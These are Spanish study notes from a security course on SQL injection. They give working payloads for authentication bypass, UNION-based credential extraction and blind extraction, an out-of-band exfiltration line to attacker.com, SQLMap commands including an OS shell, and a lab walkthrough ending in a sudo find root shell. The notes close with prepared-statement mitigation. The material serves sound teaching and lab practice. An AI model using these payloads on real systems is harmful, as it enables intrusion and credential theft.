# SQL Injection (SQLi)

> [!danger] Vulnerabilidad crítica — OWASP Top 10: A03:2021 (Injection)
> SQLi permite inyectar código SQL malicioso en consultas concatenadas con datos del usuario, manipulando la lógica de la base de datos desde la aplicación web.

---

## ¿Qué es SQLi?

**SQL Injection (SQLi)** = inyectar código SQL en consultas que se concatenan con entrada del usuario sin sanitizar.

> [!important] La clave conceptual
> Lo vulnerable **no es el servidor**, ni el puerto, ni la base de datos, ni el frontend. **Lo vulnerable son los ficheros PHP** (u otra lógica server-side) que reciben input del usuario y lo concatenan directamente en una query SQL.

### Cómo funciona una aplicación web (capa vulnerable)

```
┌──────────┐     ┌──────────────┐     ┌──────────┐
│ Frontend │────▶│ PHP (app)    │────▶│ MySQL    │
│ (HTML/JS)│◀────│ ← VULNERABLE │◀────│ DB       │
└──────────┘     └──────────────┘     └──────────┘
```

El frontend envía datos al PHP. El PHP construye la consulta SQL. **Ahí es donde ocurre la inyección**: si el PHP concatena el input del usuario directamente en la query, el atacante controla la lógica SQL.

### El patrón vulnerable

```php
// ❌ CONCATENACIÓN DIRECTA — pattern vulnerable
$query = "SELECT * FROM users WHERE user='$u' AND pass='$p'";
$result = mysqli_query($con, $query);
```

Si el usuario introduce `admin' OR '1'='1' --` como valor de `$u`, la query se convierte en:

```sql
SELECT * FROM users WHERE user='admin' OR '1'='1' --' AND pass=''
							o
SELECT * FROM users WHERE user='admin' OR '1=1' --' AND pass=''
            dependera de como esta cofigurado
```

- `--` comenta el resto de la query (se ignora la verificación de password)
- `'1'='1'` siempre es `TRUE`
- **Resultado**: autenticación saltada sin password

---

## Niveles de una base de datos (para atacar con criterio)

Antes de atacar, hay que entender la estructura de una BD:

| Nivel | Qué es | Ejemplo |
|---|---|---|
| **Servidor** | Máquina donde corre la BD | PostgreSQL, MySQL |
| **Base de datos** | Contenedor principal | `megacorp` |
| **Esquema** | BD activa dentro del servidor | `public` |
| **Tabla** | Conjunto de registros | `cars` |
| **Columna** | Campo de cada registro | `name`, `type`, `fuel` |
| **Fila/Dato** | Contenido real | `Toyota, Sedán, Gasolina` |

> [!important] Por qué importa esto
> Para hacer una query necesitas saber: servidor → BD → esquema → tabla → columna → dato. Si no tienes esta información, no puedes extraer nada.

---

## Clasificación de SQLi

| Categoría | Tipos | Cómo recibes la info |
|---|---|---|
| **Inband (clásica)** | Error-based, Union-based | Los datos salen en la **misma respuesta HTTP** |
| **Blind (inferencial)** | Boolean-based, Time-based | No ves datos, solo **observas comportamiento** |
| **Out of Band** | DNS/HTTP exfil | Los datos salen por un **canal distinto** (collaborator) |

> [!important] Resumen en una frase
> - **Inband:** "Los veo en pantalla"
> - **Blind:** "Los deduzco por comportamiento"
> - **Out of Band:** "Los recibo por otro sitio"

---

## Metodología manual paso a paso

> [!example] Flujo completo (Basin / PortSwigger): detectar → contar → inyectar → extraer

```
PASO 0: Detectar
  search=a'  → Error de SQL ✓

PASO 1: Contar columnas
  search=a' ORDER BY 1--  → OK
  search=a' ORDER BY 2--  → OK
  search=a' ORDER BY 3--  → OK
  search=a' ORDER BY 4--  → OK
  search=a' ORDER BY 5--  → OK
  search=a' ORDER BY 6--  → ERROR
  Resultado: 5 columnas

PASO 2: UNION SELECT
  search=a' UNION SELECT NULL,NULL,NULL,NULL,NULL--  → OK (fila vacía)

PASO 3: Columnas visibles
  search=a' UNION SELECT 1,NULL,NULL,NULL,NULL--  → Aparece 1
  search=a' UNION SELECT NULL,2,NULL,NULL,NULL--  → Aparece 2
  Resultado: columnas 1 y 2 son visibles

PASO 4: Tipo de datos
  search=a' UNION SELECT 'a','b','c','d','e'--  → Aparecen 'a' y 'b'
  Resultado: columnas 1 y 2 son de tipo string

PASO 5: Extraer datos
  search=a' UNION SELECT username,password,NULL,NULL,NULL FROM users--
```

### Detección — Paso 0 (la prueba de la comilla)

```
http://target/index.php?search=a'
```

Si la página devuelve un **error de SQL**, hay vulnerabilidad:

```sql
SELECT * FROM cars WHERE name LIKE '%a'%'
                                  ^-- Error aquí
```

> [!info] Qué buscar en el error
> - `You have an error in your SQL syntax`
> - `Query failed`
> - `MySQL server version`
> - Cualquier mensaje que muestre la consulta SQL

### Confirmar con OR 1=1

```
http://target/index.php?search=a' OR 1=1--
```

Si devuelve **TODOS los resultados** (no solo los que empiezan por "a"), confirmas que hay SQLi.

> [!warning] Probar SIEMPRE comilla simple Y doble
> Si una no funciona, la otra puede funcionar. Depende de cómo esté escrita la query por detrás: `parameter='` → 500 / `parameter=''` → 200 / `parameter="` → 500 / `parameter=""` → 200.

---

## Técnicas de SQLi

### 1. UNION-based

Usa `UNION SELECT` para combinar resultados de otras tablas en la respuesta original.

```
' UNION SELECT 1,2,3,4-- 
' UNION SELECT null,table_name,null FROM information_schema.tables-- 
' UNION SELECT null,username,password FROM users-- 
```

> [!tip] Las dos reglas de oro (UNION)
> 1. **Mismo número de columnas** que la query original
> 2. **Tipos compatibles** (string con string, num con num)
> - Se usa para extraer datos directamente visibles en la página

### Contar columnas — ORDER BY vs NULL

```sql
ORDER BY 1--    -- Funciona (hay al menos 1 columna)
ORDER BY 2--    -- Funciona
ORDER BY 5--    -- ERROR (no hay 5 columnas)
```

> [!important] La regla
> Si `ORDER BY N` funciona y `ORDER BY N+1` da error, la tabla tiene **N columnas**.

También se puede contar con `NULL` (compatible con **cualquier tipo de dato**):

```sql
' UNION SELECT NULL--           → ERROR
' UNION SELECT NULL,NULL--      → ERROR
' UNION SELECT NULL,NULL,NULL-- → OK (3 columnas)
```

> [!tip] ORDER BY vs NULL
> - `ORDER BY`: Cuando peta, el número **anterior** es el correcto (ORDER BY 4 peta → 3 columnas)
> - `NULL`: Cuando peta, es el número que **pusiste** (UNION SELECT NULL,NULL,NULL,NULL peta → 3 era correcto)

### Identificar columnas visibles

```sql
UNION SELECT 1,NULL,NULL,NULL,NULL--    -- ¿Aparece el 1?
UNION SELECT NULL,2,NULL,NULL,NULL--    -- ¿Aparece el 2?
```

Las posiciones donde **aparezca un número** son las columnas visibles en el HTML.

### Identificar tipo de datos

```sql
UNION SELECT 'a','b','c','d',5--
```

| Resultado | Tipo de columna |
|---|---|
| Aparece la letra | String/VARCHAR |
| Aparece el número | Numérico/INT |
| Error (500) | Tipo incompatible |

> [!warning] Cuidado con los tipos
> Si la columna es `INT` y metes un `string`, la query peta (500). Si es `VARCHAR` y metes un número, a veces funciona (lo detecta como string) pero no siempre.

### 2. Error-based

Fuerza errores SQL deliberados que revelan información en los mensajes de error.

```
' AND extractvalue(1, concat(0x7e, (SELECT version()), 0x7e))-- 
' AND updatexml(1, concat(0x7e, (SELECT database()), 0x7e), 1)-- 
```

### 3. Blind SQLi

No hay output visible en la página. Se infiere la verdad por comportamiento.

#### Boolean-based

La respuesta cambia según si la condición es verdadera o falsa:

```
' AND 1=1-- → respuesta normal (TRUE)
' AND 1=2-- → respuesta diferente (FALSE)
' AND (SELECT LENGTH(password) FROM users WHERE user='admin')=8-- 
```

> [!example] Ejemplo con tracking cookie (PortSwigger)
> ```
> TrackingId=xyz' AND 1=1--  → Welcome back (TRUE)
> TrackingId=xyz' AND 1=2--  → No aparece (FALSE)
> ```
> La consulta detrás: `SELECT * FROM tracking WHERE tracking_id = 'xyz'` — si la consulta es `WHERE id = 'valor'`, necesitas cerrar la comilla antes de inyectar.

Para extraer datos carácter a carácter:

```sql
' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE username='administrator')='a'--
```

Si TRUE → la primera letra del usuario es 'a'. Si FALSE → probamos con 'b', 'c', etc. **Esto es MUY lento**, pero funciona.

#### Time-based

La respuesta no cambia, pero el **tiempo de respuesta** sí:

```
' AND IF(1=1, SLEEP(5), 0)-- 
' AND IF((SELECT LENGTH(password) FROM users WHERE user='admin')=8, SLEEP(5), 0)-- 
```

> [!warning] Blind SQLi es lento
> Cada carácter se pregunta por separado. Con un password de 32 chars × 26 posiciones = hasta 832 requests. Por eso se usa automatización (SQLMap).

### 4. Out of Band (DNS/HTTP exfil)

Ni vemos contenido, ni hay cambios, ni hay tiempos. Los datos salen por un **canal externo** que nosotros controlamos (Burp Collaborator o servidor propio):

```sql
' UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT version()), '.attacker.com\\file'))--
```

La BD hace una petición DNS a nuestro servidor con la versión de la BD.

> [!important] Cuándo usar Out of Band
> Cuando no hay output visible, no hay cambio de comportamiento ni diferencia de tiempos — el único canal es una conexión saliente que el servidor puede abrir.

---

## Explotar desde Burp Suite (Repeater)

### Por qué no desde el navegador

- Se pierde el URL encode
- Las consultas son largas y se cortan
- No puedes reenviar peticiones modificadas fácilmente

### Flujo

1. Activar Foxy Proxy (127.0.0.1:8080)
2. Login + buscar algo en la web
3. Burp → Proxy → HTTP History → localizar la petición
4. Clic derecho → **Send to Repeater**
5. En Repeater: modificar el parámetro libremente (comillas, OR, UNION), ver respuesta completa (HTML, headers, status code), iterar rápido sin recargar la web

---

## Fuzzing con Burp Intruder (detección automatizada)

### Paso 1: Mapear la aplicación

1. Activar Foxy Proxy + Burp
2. Ir a Target → Scope → Añadir URL
3. **Hacer clic en TODOS los botones** de la web
4. En HTTP History → Ordenar por **parámetros**

### Paso 2: Identificar parámetros únicos

- Marcar en **naranja** los parámetros nuevos (primera vez que aparecen)
- Enviar al **Repeater** los parámetros únicos
- Ignorar parámetros repetidos (mismo nombre, diferente valor)

### Paso 3: Fuzzing con Intruder

1. En el Repeater, enviar la petición al Intruder (Ctrl+I)
2. En Intruder → Positions → **Clear** y marcar el parámetro a testear
3. Cargar lista de payloads (SQLi, XSS, LFI, etc.)
4. **Start Attack**

### Paso 4: Analizar resultados

| Campo | Qué buscar |
|---|---|
| **Status code** | Un código diferente al resto (ej: 500 cuando todos dan 302) |
| **Length** | Una longitud de respuesta diferente |
| **Error** | Mensajes de error que no aparecen en otros payloads |
| **Timeout** | Respuestas que tardan más (time-based) |

> [!important] Una respuesta diferente = posible vulnerabilidad
> Si 999 payloads dan igual y 1 da diferente, **ahí hay oro**. Ir al Repeater y testear manualmente.

---

## SQLMap

> [!info] Referencia: [[comandos/SQLMap]]
> SQLMap automatiza la detección y explotación de SQLi.

```bash
# Detección básica
sqlmap -u "http://target/page.php?id=1" --dbs

# Con POST data
sqlmap -u "http://target/login.php" --data="user=admin&pass=test" --dbs

# Extraer tablas
sqlmap -u "http://target/page.php?id=1" -D base_de_datos --tables

# Extraer datos
sqlmap -u "http://target/page.php?id=1" -D base_de_datos -T usuarios --dump

# Shell remota
sqlmap -u "http://target/page.php?id=1" --os-shell
```

> [!warning] No uses SQLMap sin entender qué hace
> SQLMap genera mucho tráfico y puede dejar registros en logs. Úsalo con criterio.

---

## Machine "Injected" (HackerLab) — Caso práctico

> [!example] Cadena completa de explotación: SQLi → RCE → Root

### Paso 1: Enumeración web

```bash
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt
```

Se encuentra `backup.php` (o página con formulario de login vulnerable).

### Paso 2: SQLi — acceso sin credenciales

```
user: admin' OR '1'='1' -- 
pass: (cualquier cosa)
```

Se accede al panel. Se obtiene un hash MD5 de un usuario.

### Paso 3: Cracking del hash

```bash
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
# Resultado: qwerty
```

### Paso 4: Escalada a RCE

Dentro de la aplicación se encuentra una funcionalidad que permite ejecutar comandos (o se explota una funcionalidad adicional). Se obtiene una reverse shell.

### Paso 5: Escalada de privilegios

```bash
sudo -l
# (ALL) NOPASSWD: /usr/bin/find

sudo find . -exec /bin/sh -p \; -quit
# ROOT
```

> [!tip] Patrón habitual
> Web vulnerable → credenciales/hash → reverse shell → sudo/GTFOBins → root

---

## Conexión con otras vulnerabilidades

> [!note] Todas comparten la misma raíz: input del usuario en lógica server-side

| Vulnerabilidad | Mecanismo | Relación con SQLi |
|---------------|-----------|-------------------|
| **XXE** | Input XML procesado por el servidor | Mismo patrón: confiar en input externo |
| **Path Traversal** | Rutas concatenadas sin sanitizar | Mismo patrón: concatenar input en path |
| **LFI** | Ficheros incluidos por nombre del usuario | Mismo patrón: input del usuario controla qué se ejecuta |
| **Command Injection** | Comandos del SO concatenados con input | Evolución: de DB al SO directamente |

> [!danger] La cadena de explotación real
> En máquinas como Injected, la SQLi es la **puerta de entrada**. Una vez dentro, el patrón se repite: buscar funcionalidades que ejecuten código en el servidor → RCE → escalada.

---

## Mitigación (Blue Team)

### Prepared Statements (PDO) — La solución correcta

```php
// ✅ PREPARED STATEMENT — parámetros separados de la query
$stmt = $pdo->prepare("SELECT * FROM users WHERE user = :user AND pass = :pass");
$stmt->execute(['user' => $u, 'pass' => $p]);
```

> [!important] ¿Por qué funciona?
> Con prepared statements, **la query se compila primero** y los parámetros se pasan después. El motor SQL distingue entre código (la query) y datos (el input). Nunca se interpretan los datos como instrucciones SQL.

### Otras mitigaciones

| Medida | Descripción |
|--------|-------------|
| **Prepared statements** | PDO / mysqli_prepare — la solución primaria |
| **Input validation** | Whitelist de caracteres permitidos |
| **Least privilege** | El usuario de BD solo tiene los permisos necesarios |
| **WAF** | Web Application Firewall como capa adicional |
| **Error handling** | No mostrar errores SQL al usuario |
| **SQLMap detection** | Monitorear patrones de requests automatizados |

> [!quote] Andrés — 14.07.2026
> "Lo vulnerable no es el servidor, ni el puerto, ni la base de datos, ni el front. Lo vulnerable son los ficheros PHP."

---

## Checklist de repaso

- [ ] Identifico inputs del usuario que se concatenan en queries SQL
- [ ] Distingo entre UNION, error-based y blind SQLi
- [ ] Sé usar SQLMap para automatizar la explotación
- [ ] Conozco la cadena completa: SQLi → hash → RCE → root
- [ ] Entiendo que prepared statements eliminan la vulnerabilidad
- [ ] Conozco la conexión entre SQLi, XXE, Path Traversal y LFI
- [ ] Recuerdo: el vulnerable es el PHP, no la DB ni el servidor
- [ ] Sé detectar SQLi con comilla simple y confirmar con OR 1=1
- [ ] Cuento columnas con ORDER BY y con UNION SELECT NULL
- [ ] Identifico columnas visibles y sus tipos de datos antes de extraer
- [ ] Distingo Inband, Blind y Out of Band según dónde salga la info
- [ ] Exploto con Burp Repeater (no desde la barra de direcciones)
- [ ] Mapeo la app → parámetros únicos → Intruder → busco respuestas anómalas

---

## Tags

#web #sqli #owasp #injection #prepared-statements #sqlmap #blue-team #order-by #union-select #blind #out-of-band #burp #intruder #repeater #portswigger









---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[../../apuntes Andres/10.09.2026 SQLi Inyecciones - Labs III.md|10.09.2026 SQLi Inyecciones - Labs III]] — SQL Injection, Testing, Burp Suite
- [[../../apuntes Andres/15.09.2026 SQLi - Inyecciones - Labs - Avanzado II.md|15.09.2026 SQLi - Inyecciones - Labs - Avanzado II]] — SQL Injection, Inband, Blind, Out of Band
- [[../../apuntes Andres/08.09.2026 SQLi Inyecciones - Labs I.md|08.09.2026 SQLi Inyecciones - Labs I]] — SQL Injection, Funcional, Testing
- [[../../apuntes Andres/07.09.2026 SQLi - Fundamentos de SQL.md|07.09.2026 SQLi - Fundamentos de SQL]] — SQL Injection, Database, Testing
- [[../../apuntes Chema/2026-09-10 - SQL Injection manual - Carlos Castillo.docx.md|2026-09-10 SQL Injection manual - Carlos Castillo]] — SQL Injection, Manual, Testing
- [[../../apuntes Chema/15-09-2026 - SQL Injection - Yuba González Parrilla.docx.md|15-09-2026 SQL Injection - Yuba González Parrilla]] — SQL Injection, Inband, Blind
- [[../../apuntes Chema/Apuntes_SQLi_Inyecciones_Labs_I_2026-09-08.docx.md|Apuntes SQLi Inyecciones Labs I]] — SQL Injection, Testing, Burp Suite
- [[../../apuntes Chema/PortSwigger_SQLi_I_2026-09-22_v001.docx.md|PortSwigger SQLi I]] — SQL Injection, PortSwigger, Testing
- [[../../apuntes Andres/29.06.2026 Vulnerabilidades Web OWASP Top 10 y Reconocimiento Web.md|29.06.2026 Vulnerabilidades Web OWASP Top 10 y Reconocimiento Web]] — Linux, Post-Explotacion, XXE
- [[../../apuntes Andres/03.09.2026 OWASP API Top 10 La API habla de más.md|03.09.2026 OWASP API Top 10 La API habla de más]] — Hack The Box, SQL Injection, XXE
- [[../../apuntes Chema/Maquinas/Vaccine.md|Vaccine]] — Hack The Box, Netcat / Reverse Shells, SQL Injection
- [[../../apuntes Chema/OWASP Top 10, CVSS, CWE y CVE.md|OWASP Top 10, CVSS, CWE y CVE]] — Blue Team / SOC, SQL Injection, XXE
- [[OWASP Top 10 - CVE CVSS CWE.md|OWASP Top 10 - CVE CVSS CWE]] — Blue Team / SOC, SQL Injection, XXE

### 🌐 Cross-Dominio

- [[../../../programacion/Rust/fundamentos_rust.md|fundamentos_rust]] — Programacion: Desarrollo Web, Linux, Manejo de Errores
- [[../../../programacion/Go/seguridad_go.md|seguridad_go]] — Programacion: Desarrollo Web, Linux, SQL

> #blue_team #cli #command_injection #crypto #database #error_handling #escalada_privilegios #go #hack_the_box #java #lfi #linux #linux_ciber #metasploit #netcat #post_explotacion #redes #redes_ciber #reverse_shell #sql #sqli #sqlmap_tool #ssrf #web #xxe
